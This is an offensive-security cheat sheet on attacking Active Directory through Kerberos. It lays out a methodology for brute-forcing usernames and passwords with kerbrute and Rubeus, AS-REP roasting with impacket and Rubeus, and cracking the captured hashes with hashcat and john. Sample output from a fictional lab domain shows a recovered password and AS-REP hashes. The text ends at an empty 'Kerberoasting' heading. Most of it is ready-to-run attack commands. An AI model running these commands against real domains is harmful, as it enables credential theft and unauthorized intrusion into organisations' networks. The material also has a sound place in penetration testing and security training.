# Active Directory Hacking 

## Kerberoasting

Kerberoasting is a cyberattack that exploits the Kerberos authentication protocol. Threat actors steal Kerberos service tickets to uncover the plaintext passwords of network service accounts. 

## Methodology

1. Finding username is the first step.
```bash
python kerbrute.py -domain jurassic.park -users users.txt -passwords passwords.txt -outputfile jurassic_passwords.txt
```

```powershell
PS C:\Users\user01> .\Rubeus.exe brute /users:users.txt /passwords:passwords.txt /domain:jurassic.park /outfile:jurassic_passwords.txt
```

Expected Output:

```bash
[+] Valid user => velociraptor
[+] Valid user => trex
[+] Valid user => triceratops
[+] STUPENDOUS => triceratops:Sh4rpH0rns
[*] Saved TGT into triceratops.kirbi
```

2. ASREPRoast - Look for users without pre-authentication required
The ASREPRoast attack looks for users without Kerberos pre-authentication required. That means that anyone can send an AS_REQ request to the KDC on behalf of any of those users, and receive an AS_REP message. This last kind of message contains a chunk of data encrypted with the original user key, derived from its password. Then, by using this message, the user password could be cracked offline.
The script GetNPUsers.py can be used from a Linux machine in order to harvest the non-preauth AS_REP responses. The following commands allow to use a given username list or query to obtain a list of users by providing domain credentials:
If you are guessing username;

```bash
root@kali:impacket-examples# python GetNPUsers.py jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast

root@kali:impacket-examples# cat hashes.asreproast 
$krb5asrep$23$velociraptor@JURASSIC.PARK:7c2e70d3d46b4794b9549bba5c6b728e$599da4e9b7823dbc8432c188c0cf14151df3530601ad57ee0bc2730e0f10d3f1552b3552cee9431cf3f1b119d099d3cead7ea38bc29d5d83074035a2e1d7de5fa17c9925c75aac2717f49baae54958ec289301a1c23ca2ec1c5b5be4a495215d42e9cbb2feb8b7f58fb28151ac6ecb0684c27f14ecc35835aecc3eec1ec3056d831dd518f35103fd970f6d082da0ebaf51775afa8777f783898a1fa2cea7493767024ab3688ec4fe00e3d08a7fb20a32c2abf8bdf66c9c42f49576ae9671400be01b6156b4677be4c79d807ba61f4703d9acda0e66befc5b442660ac638983680ffa3ada7eacabad0841c9aee586
```

If you already have username and password;

```bash
root@kali:impacket-examples# python GetNPUsers.py jurassic.park/triceratops:Sh4rpH0rns -request -format hashcat -outputfile hashes.asreproast
Impacket v0.9.18 - Copyright 2018 SecureAuth Corporation

Name          MemberOf                                       PasswordLastSet      LastLogon            UAC      
------------  ---------------------------------------------  -------------------  -------------------  --------
velociraptor  CN=Domain Admins,CN=Users,DC=jurassic,DC=park  2019-02-27 17:12:12  2019-03-18 11:44:04  0x410200 



root@kali:impacket-examples# cat hashes.asreproast 
$krb5asrep$23$velociraptor@JURASSIC.PARK:6602e01d59b4eeba815ab467194a9de4$b13a0e139b1daa46a457b3fa948c22cbbaad75a94c2b37064d757185d171c258e290210339d950b9245de6fa40a335986146a8c71c0b60f633b4c040141460a0a91737670f21caae6261ebde0151c06adceac22bfed84cb8c1f07948fb8e75b8a1d64c768c9e3f3a50d035ec03df643ea185648406b634b6fd673028e6e90ea429f57f9229b00f47f2bba2cdb7297d29b9f97a83d07c89dee7ea673340f64c443a213d5b9bbed969a68ca7a0ea41245b0fa985f64261803488b61821fbaedf43d50ea16075b2379bb354e4001d73dfd19cc8787b4bcd2bd9b542e0e2b1218ee8c16699c134ae5ec587afe0fd1880
```

```powershell
C:\Users\triceratops>.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.3.3

[*] Action: AS-REP roasting

[*] Using domain controller: Lab-WDC01.jurassic.park (10.200.220.2)
[*] Building AS-REQ (w/o preauth) for: 'jurassic.park\velociraptor'
[*] Connecting to 10.200.220.2:88
[*] Sent 170 bytes
[*] Received 1423 bytes
[+] AS-REQ w/o preauth successful!
[*] Hash written to C:\Users\triceratops\hashes.asreproast

[*] Roasted hashes written to : C:\Users\triceratops\hashes.asreproast

C:\Users\triceratops>type hashes.asreproast
$krb5asrep$23$velociraptor@jurassic.park:BBEC05D876E5133F5AB0CEDA07572FE0$4A826CD2123EBC266179A9009E867EAAC03D1C8C9880ACF76DCA4B5919F967E86DBB6CD475DA8EF5C83B1B8388D22DA005BA10D5CB4D10F3C3F44C918ACD5843660C4FF5C678E635F7751A109524D693DB29BF75A5F0995B41CD35600B969FE371F77AD13F48604DFAB87253D324E8F53C267A2299D2450245D317D319A4FD424B42F815B79E2DD16C58AB2A2C106EB6995AFF70C8E889D8F170B35E78993157B3B3D13DCCE18A720BC5810C474CBC95C07B5FFCEE5EE06442FDB6244C33EECA4BFCD4F6C051A5F00C40A837A9644ADA70A381A85089F05CFB5E5F03AB0C7525BBA6AEAF9DA3554D3D700DD54760
```

3. Cracking the AS_REP

```bash
root@kali:impacket-examples# hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt
```

```bash
root@kali:kali# john --wordlist=passwords_kerb.txt hashes.asreproast
```

4. Kerberoasting
